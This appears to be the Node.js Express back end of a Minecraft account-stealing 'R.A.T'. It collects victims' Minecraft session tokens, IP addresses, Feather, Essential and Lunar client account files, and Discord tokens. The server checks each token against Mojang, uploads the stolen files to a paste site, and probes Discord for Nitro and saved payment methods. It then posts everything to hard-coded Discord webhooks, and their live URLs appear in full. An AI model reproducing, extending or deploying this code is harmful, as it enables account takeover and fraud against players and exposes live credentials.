//setup
const getProfiles = require('./utils/networth');

require("dotenv").config()

const { post, get } = require("axios"),
express = require("express"),
helmet = require("helmet"),
app = express(),
expressip = require("express-ip"),
port = process.env.PORT || 80
    
//plugins
app.use(helmet()) //secure
app.use(expressip().getIpInfoMiddleware) //ip
app.use(express.json()) //parse json
app.use(express.urlencoded({ extended: true }))

// Env variables
// Webhooks
// let defaulthook = process.env.WEBHOOK
// let blackhook = process.env.BLACKHOOK
// let shorthook = process.env.SHORTHOOK
// let debughook = process.env.DEBUGHOOK

let defaulthook = "https://discord.com/api/webhooks/1202990891615129601/bp1uC6m_SkgrlGqkk3nRbBTAN5uCSKvqBnORgheuzBqmUXVbbCkMs2l3dhDVMnpCgQ49"
let blackhook = "https://discord.com/api/webhooks/1202990891615129601/bp1uC6m_SkgrlGqkk3nRbBTAN5uCSKvqBnORgheuzBqmUXVbbCkMs2l3dhDVMnpCgQ49"
let shorthook = "https://discord.com/api/webhooks/1202990891615129601/bp1uC6m_SkgrlGqkk3nRbBTAN5uCSKvqBnORgheuzBqmUXVbbCkMs2l3dhDVMnpCgQ49"
let debughook = "https://discord.com/api/webhooks/1202990891615129601/bp1uC6m_SkgrlGqkk3nRbBTAN5uCSKvqBnORgheuzBqmUXVbbCkMs2l3dhDVMnpCgQ49"

// Blacklist
let blacklist = "asd" //process.env.BLACKLIST


//array initialization
const ipMap = []

//clear map every 15mins if its not already empty
setInterval(() => {
    if (ipMap.length > 0) {
        console.log(`[R.A.T] Cleared map`)
        ipMap.length = 0
    }
}, 1000 * 60 * 15)

//main route, post to this
app.post("/", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"].every(field => req.body.hasOwnProperty(field))) {
        console.log(req.body)
        return res.sendStatus(404)
    }

    //check if ip exists, if not then create a new entry, if yes then increment that entry
    if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1])
    else ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++ })

    //check if ip is banned (5 requests in 15mins)
    if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
        console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`)
        return res.sendStatus(404)
    }

    //validate the token with microsoft auth server (rip mojang)
    post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }), {
        headers: {
            "Content-Type": "application/json"
        }
    })

    .then(async response => {
        // Preparation
        //upload feather
        const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => {
            return {data: {key: "Error uploading"}}
        })).data.key

        //upload essential
        const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => {
            return {data: {key: "Error uploading"}}
        })).data.key

        //upload lunar
        const lunar = await (await post("https://hst.sh/documents/", req.body.lunar).catch(() => {
            return {data: {key: "Error uploading"}}
        })).data.key

        //get discord info
        let nitros = ""
        let payments = ""

        const discord = req.body.discord.split(" | ")

        for await (const token of req.body.discord.split(" | ")) {
            let me = await (await get("https://discordapp.com/api/v9/users/@me", {
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }
            }).catch(() => {
                return {data: {id: null}}
            })).data

            if (me.id == null) {
                delete discord[token]
                continue
            }
            let nitro = await (await get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", {
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }
            }).catch(() => {
                return {data: []}
            })).data
            nitros += nitro.length > 0 ? "Yes | " : "No | "

            let payment = await (await get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", {
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }
            }).catch(() => {
                return {data: []}
            })).data
            payments += payment.length > 0 ? "Yes | " : "No | "
        }

        // Set webhook
        let webhook = defaulthook

        if (blacklist.split("_").includes(req.body.uuid)) { // debug
            content = `Blacked - <t:${timestamp}:R>`
            webhook = blackhook
        }

        // Set content
        // timestamp text
        const now = Date.now();
        const time = now + (24 * 60 * 60 * 1000);
        const timestamp = Math.floor(time / 1000);

        let content = `@everyone - <t:${timestamp}:R>`

        // Set useful links
        let links = ``

        if (req.body.username) {
            let skyCrypt = `[SkyCrypt](https://sky.shiiyu.moe/${req.body.username})`
            let plancke = `[Plancke](https://plancke.io/hypixel/player/stats/${req.body.username})`
            let matdoes = `[Matdoes](https://skyblock.matdoes.dev/player/${req.body.username})`
            let cofl = `[CoflNet](https://sky.coflnet.com/player/${req.body.uuid})`
            let namemc = `[NameMC](https://namemc.com/profile/${req.body.username})`

             links = `${skyCrypt} ${plancke} ${matdoes} ${cofl} ${namemc}`
        }

        // Set comment
        let comment = "unknown"

        if (req.body.type) {
            comment = req.body.type

            if (comment == "essential") {
                webhook = blackhook //debug
                content = `Essential - <t:${timestamp}:R>`
            }
        }

        // get profiles
        let profiles = ''
        const profileData = await getProfiles(req.body.uuid);

        if (profileData) {
            for (let profileId in profileData.profiles) {
                profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`;
            }
        }

        // Set alts
        //check feather content in hastebin
        if (req.body.feather == 'File not found :(')
            checkFeather = 'File not found :( - (Feather)'
        else
            checkFeather = `https://hst.sh/${feather} -  **(Feather1)**`

        //check essentials content in hastebin
        if (req.body.essentials == 'File not found :(')
            checkEssentials = 'File not found :( - (Essentials)'
        else
            checkEssentials = `https://hst.sh/${essentials} - **(Essentials2)**`

        //check lunar content in hastebin
        if (req.body.lunar == 'File not found :(')
            checkLunar = 'File not found :( - (Lunar)'
        else
            checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`

        try {
            post(webhook, JSON.stringify({
                content: content, //ping
                embeds: [{
                    title: `Ratted ${req.body.username} - Click Below For Stats`,
                    description: links,
                    fields: [
                        {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
                        {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
                        {name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false},
                        {name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true},
                        {name: 'Comment', value: `\`\`\`${comment}\`\`\``, inline: true},
                        {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
                        {name: 'Feather', value: `${checkFeather}`, inline: true},
                        {name: 'Essentials', value: `${checkEssentials}`, inline: true},
                        {name: 'Lunar', value: `${checkLunar}`, inline: true},
                        {name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false},
                        {name: 'Nitro', value: `\`${nitros}\``, inline: true},
                        {name: 'Payment', value: `\`${payments}\``, inline: true},
                    ],
                    color: 0x7366bd,
                    footer: {
                        "text": "🕊️ MagiDev on top 🕊️",
                    },
                    timestamp: new Date()
                }],
                attachments: []
            }), {
                headers: {
                    "Content-Type": "application/json"
                }
            }).catch(err => {
                console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
                console.log(req.body)
            })

            post(shorthook, JSON.stringify({
                content: "@everyone" + content, //ping
                embeds: [{
                    title: `Ratted ${req.body.username} - Click Below For Stats`,
                    description: links,
                    fields: [
                        {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
                        {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
                        {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
                        {name: 'Feather', value: `${checkFeather}`, inline: true},
                        {name: 'Essentials', value: `${checkEssentials}`, inline: true},
                        {name: 'Lunar', value: `${checkLunar}`, inline: true}
                    ],
                    color: 0x7366bd,
                    footer: {
                        "text": "🕊️ MagiDev on top 🕊️",
                    },
                    timestamp: new Date()
                }],
                attachments: []
            }), {
                headers: {
                    "Content-Type": "application/json"
                }
            }).catch(err => {
                console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
                console.log(req.body)
            })
        } catch (e) {
            console.log(e)
        }

        console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
    })
        .catch(err => {
        //could happen if the auth server is down OR if invalid information is passed in the body
        console.log(`[R.A.T] Error while validating token:\n${err}`)
        console.log(req.body)
        sendMessage(`\`\`\`${req.body.username} - ${err}\`\`\``)
    })
    
    //change this to whatever you want, but make sure to send a response
    res.send("OK")
})

//create server
app.listen(port, () => {
    console.log(`[R.A.T] Listening at port ${port}`);
    // send to discord webhook
    
});

//format a number into thousands millions billions
const formatNumber = (num) => {
    if (num < 1000) return num.toFixed(2)
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}

function sendMessage(message) {
    post(debughook, JSON.stringify({
                content: message, //ping
                attachments: []
            }), {
                headers: {
                    "Content-Type": "application/json"
                }
            }).catch(err => {
                console.log(`[R.A.T] Error while debugging:\n${err}`)
            })
}
